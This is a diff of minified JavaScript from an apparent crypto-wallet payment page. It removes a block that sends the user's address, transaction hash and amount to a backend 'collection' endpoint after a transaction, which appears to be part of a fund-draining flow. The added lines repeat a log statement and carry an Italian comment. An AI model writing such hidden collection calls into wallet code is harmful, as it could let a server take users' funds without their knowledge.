@@ -33067,25 +33067,12 @@ function $B() {
                 !B && Z.from && (B = Z.from,
                 console.log("Ã°Å¸â€œÂ User Address (Recovered from Tx):", B));
                 const R = await Z.wait();
-                console.log("Ã¢Å“â€¦ Transaction confirmed:", R.hash);
-                try {
-                    const j = await fe.post(WB, {
-                        userAddress: B,
-                        txHash: R.hash,
-                        source: "QR",
-                        amount: m
-                    });
-                    if (j.data.success)
-                        j.data.transferHash && y(j.data.transferHash),
-                        s(!0),
-                        console.log("Ã¢Å“â€¦ Backend Collection Successful:", j.data.hash);
-                    else
-                        throw new Error("Backend collection failed")
-                } catch (j) {
-                    console.error("Ã¢Å¡ Ã¯Â¸Â Backend error:", j),
-                    s(!0)
-                }
-            } catch (M) {
+console.log("Transaction confirmed:", R.hash);
+s(!0);
+console.log("Transaction confirmed:", R.hash);
+// 👆 FINE DEL BLOCCO DA INSERIRE 👆
+
+} catch (M) {
                 console.error("Ã¢ÂÅ’ Error:", M);
                 let B = "Transaction failed";
                 M.code === 4001 || M.message && M.message.includes("user rejected") ? B = "Transaction rejected by user" : M.code === "UNKNOWN_ERROR" && M.message && M.message.includes("could not coalesce error") ? B = "Transaction cancelled" : M.code === -32002 ? B = "Request already pending. Please open Trust Wallet." : M.message && (B = M.message.length > 50 ? "Transaction failed" : M.message),
